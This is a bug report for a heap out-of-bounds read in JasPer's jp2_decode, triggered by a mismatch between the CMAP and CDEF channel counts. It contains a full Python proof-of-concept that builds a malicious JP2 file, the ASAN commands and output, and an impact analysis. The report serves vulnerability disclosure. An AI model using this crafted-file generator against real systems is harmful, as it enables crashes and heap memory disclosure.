## Bug0: Heap OOB read in jp2_decode due to CDEF/CMAP numchans mismatch

In `jp2_decode` (`src/libjasper/jp2/jp2_dec.c`, lines 402–413), the loop bound `dec->numchans` is taken from the CMAP box while `dec->cdef->data.cdef.ents` is heap-allocated using the independently parsed CDEF box channel count, and the absence of any cross-validation between these two values allows the loop to read beyond the end of the `ents` buffer when CMAP numchans exceeds CDEF numchans.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = 'poc_input.jp2'

def make_box(type_tag: bytes, data: bytes) -> bytes:
    assert len(type_tag) == 4
    length = 8 + len(data)
    return struct.pack('>I', length) + type_tag + data

# 1. JP2 Signature box
sig_box = make_box(b'jP  ', b'\x0D\x0A\x87\x0A')

# 2. File Type box
ftyp_data = b'jp2 ' + struct.pack('>I', 0) + b'jp2 '
ftyp_box = make_box(b'ftyp', ftyp_data)

# 3. JP2 Header superbox contents
ihdr_data  = struct.pack('>II', 1, 1)
ihdr_data += struct.pack('>H', 3)
ihdr_data += bytes([7, 7, 0, 0])
ihdr_box = make_box(b'ihdr', ihdr_data)

bpcc_box = make_box(b'bpcc', bytes([7, 7, 7]))

colr_data = struct.pack('>BBB', 1, 0, 0) + struct.pack('>I', 16)
colr_box = make_box(b'colr', colr_data)

# pclr: 4 entries, 1 channel, 8-bit unsigned
pclr_data  = struct.pack('>H', 4)
pclr_data += bytes([1])
pclr_data += bytes([7])
pclr_data += bytes([0x00, 0x40, 0x80, 0xFF])
pclr_box = make_box(b'pclr', pclr_data)

# cmap: 3 entries (sets dec->numchans = 3)
cmap_data = b''
for _ in range(3):
    cmap_data += struct.pack('>H', 0) + bytes([1, 0])
cmap_box = make_box(b'cmap', cmap_data)

# cdef: only 1 entry (ents[] allocated for 1 element — triggers OOB when loop runs 3 times)
cdef_data  = struct.pack('>H', 1)
cdef_data += struct.pack('>HHH', 0, 0, 1)
cdef_box = make_box(b'cdef', cdef_data)

jp2h_content = ihdr_box + bpcc_box + colr_box + pclr_box + cmap_box + cdef_box
jp2h_box = make_box(b'jp2h', jp2h_content)

# 4. Minimal JPEG-2000 codestream
soc = b'\xFF\x4F'

siz  = b'\xFF\x51'
siz += struct.pack('>HH', 41, 0)
siz += struct.pack('>IIIIIIII', 1, 1, 0, 0, 1, 1, 0, 0)
siz += struct.pack('>H', 1)
siz += bytes([7, 1, 1])

cod  = b'\xFF\x52'
cod += struct.pack('>HB', 12, 0)
cod += bytes([0x00, 0x00, 0x01, 0x00])
cod += bytes([0x00, 0x04, 0x04, 0x00, 0x01])

qcd  = b'\xFF\x5C'
qcd += struct.pack('>H', 4)
qcd += bytes([0x00])
qcd += bytes([0x20])

sot  = b'\xFF\x90'
sot += struct.pack('>H', 10)
sot += struct.pack('>H', 0)
sot += struct.pack('>I', 14)
sot += bytes([0, 1])

sod = b'\xFF\x93'
eoc = b'\xFF\xD9'

codestream = soc + siz + cod + qcd + sot + sod + eoc
jp2c_box = make_box(b'jp2c', codestream)

# 5. Assemble final JP2 file
jp2_bytes = sig_box + ftyp_box + jp2h_box + jp2c_box

with open(OUTPUT_FILE, 'wb') as f:
    f.write(jp2_bytes)

print(f"[+] Written {len(jp2_bytes)} bytes to {OUTPUT_FILE}")
print(f"    CMAP numchans: 3  (dec->numchans = 3)")
print(f"    CDEF numchans: 1  (ents[] has 1 entry)")
print(f"    Loop at jp2_dec.c:403 reads ents[1] and ents[2] => heap OOB read")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000238 at pc 0x5648e0060fe6 bp 0x7ffdcfa3fb70 sp 0x7ffdcfa3fb60
READ of size 8 at 0x503000000238 thread T0
    #0 0x5648e0060fe5 in jp2_decode (imginfo+0x52cfe5)
    #1 0x5648e00074ef in jas_image_decode (imginfo+0x4d34ef)

### Impact

An attacker who supplies a crafted JP2 file with a CMAP box declaring more channels than the CDEF box can trigger a heap-buffer-overflow read in `jp2_decode`, causing adjacent heap memory to be interpreted as channel metadata, which may leak sensitive heap contents (information disclosure) or cause the process to crash (denial of service). Any invocation of `imginfo` or any application calling `jas_image_decode` on an untrusted JP2 file is exposed to this vulnerability with no authentication required. If the out-of-bounds `channo` value passes the bounds guard, the corrupted value is forwarded to `jas_image_setcmpttype`, creating a path toward further heap corruption that could potentially lead to arbitrary code execution.
